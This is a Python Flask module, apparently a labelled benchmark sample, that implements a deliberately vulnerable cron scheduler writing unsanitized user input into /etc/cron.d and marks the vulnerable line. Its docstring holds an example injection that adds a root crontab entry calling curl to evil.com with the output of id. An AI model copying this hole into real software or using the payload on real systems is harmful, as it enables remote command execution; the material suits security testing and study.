"""Task scheduler -- VULNERABLE variant.

Accepts a task name, cron schedule expression, and shell command from the user
and writes them directly into /etc/cron.d/ without sanitizing any field. An
attacker can inject a newline into the task name or a shell metacharacter into
the command to add extra crontab entries or cause the cron daemon to execute
arbitrary commands at the next scheduled interval.

Example injection: task_name = "report\n* * * * * root curl http://evil.com/$(id)"

Chain: POST /schedule with injected fields -> write_crontab_entry() writes raw
       input -> cron executes injected command at interval -> RCE
Individual findings: unsanitized user input written to crontab (high)
Chain finding: cron injection enables scheduled OS command execution (critical,
               CWE-78)
"""
import os
from flask import Blueprint, request, jsonify
from task_runner import TASK_REGISTRY

scheduler_bp = Blueprint("scheduler", __name__)

CRON_DIR = os.environ.get("CRON_DIR", "/etc/cron.d")


def write_crontab_entry(task_name: str, schedule: str, command: str) -> str:
    """Write a crontab entry file for a scheduled task.

    All three parameters come from user input without sanitization.
    """
    cron_content = f"{schedule} root {command}\n"
    cron_file = os.path.join(CRON_DIR, f"task_{task_name}")
    with open(cron_file, "w") as fh:
        fh.write(cron_content)
    return cron_file


# vuln-code-snippet start chain_cron_inject_vuln
@scheduler_bp.route("/schedule", methods=["POST"])
def schedule_task():
    """Create a new scheduled task.

    Expects JSON with 'task_name', 'schedule' (cron expression), and 'command'.
    """
    body = request.get_json(silent=True)
    if not body:
        return jsonify({"error": "JSON body required"}), 400

    task_name = body.get("task_name", "")
    schedule = body.get("schedule", "")
    command = body.get("command", "")

    if not all([task_name, schedule, command]):
        return jsonify({"error": "task_name, schedule, and command are required"}), 400

    cron_file = write_crontab_entry(task_name, schedule, command)  # vuln-code-snippet vuln-line chain_cron_inject_vuln
    TASK_REGISTRY[str(task_name)] = str(command)

    return jsonify({
        "status": "scheduled",
        "task_name": task_name,
        "cron_file": cron_file,
    }), 201
# vuln-code-snippet end chain_cron_inject_vuln
